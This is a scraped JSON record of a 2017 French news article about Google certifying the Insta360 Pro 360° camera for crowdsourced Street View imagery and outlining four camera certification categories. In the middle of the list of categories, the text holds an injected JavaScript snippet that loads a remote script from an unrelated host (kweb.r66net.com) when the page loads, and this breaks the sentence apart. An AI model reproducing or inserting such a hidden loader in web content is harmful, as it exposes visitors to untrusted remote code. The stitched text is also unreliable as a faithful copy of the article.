{"title": "Street View : Google certifie une camera 360deg pour vous faire travailler gratuitement", "newspaper": "Futura Sciences", "author": ["Jean-Luc Goudet"], "date_publi": "2017-10-10", "content": "Deboursez 4.000 euros pour acheter cette camera a fixer sur votre voiture et vous aurez le droit d'alimenter le service Street View de Google. Ne dites pas  << travail benevole >> mais   << crowdsourcing >> ... Annoncee en mai, cette campagne de  certification  de cameras vise a permettre au service  Google Street View  de profiter des possibilites du  crowdsourcing  en autorisant les utilisateurs lambda a enrichir la carte immersive. Plusieurs certifications ont ete definies, dont l'une pour les cameras embarquees sur un vehicule. Le premier modele a decrocher ce  feu  vert est l'Insta360 VR Pro, de fabrication chinoise et dediee a la  realite virtuelle . Cette camera 360deg 8K, vendue environ 4.200 euros, est equipee d'un systeme de stabilisation et d'un algorithme d'assemblage du flux d'images enregistrees pendant que le vehicule est en  mouvement . L'utilisateur peut controler la camera avec l' application  Street View et envoyer son contenu filme a 360deg directement vers le site, grace a un  logiciel  special. La camera sera egalement pretee a des photographes, voyageurs et autres contributeurs approuves par  Google . La camera professionnelle Insta360 VR Pro, fabriquee par la start-up chinoise du meme nom, s'etait fait remarquee au CES 2017, a Las Vegas. (c) DR                               Quatre familles de cameras travailleront pour Google L'Insta360 Pro 8K fait partie des vingt nouvelles  cameras 360deg  qui vont apparaitre sur le marche dans les mois a venir. Google a prevu quatre categories de certification :  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  les cameras mobiles Street View, capables de publier des images prises a 360deg a partir d'une application mobile ; les cameras Street View VR, qui enregistrent des donnees geometriques en plus des photos ; des cameras qui seront associees a des outils de publication capables de telecharger du contenu vers les comptes Street View ; les cameras << auto ready >>, qui peuvent capturer des images avec la plus grande precision, comme l'Insta360 Pro. Avec AFP Vous avez aime cet article ? N'hesitez pas a le partager avec vos ami(e)s et aidez-nous a faire connaitre Futura :) ! La Redaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest A voir aussi :  google street  |  google voiture camera  |  street war  |  travailler pour wwf  |  certifie bbc  |  googl street  |  street views  |  pay per view definition  |  view compagnon  |  ocean data view", "theme": "tech"}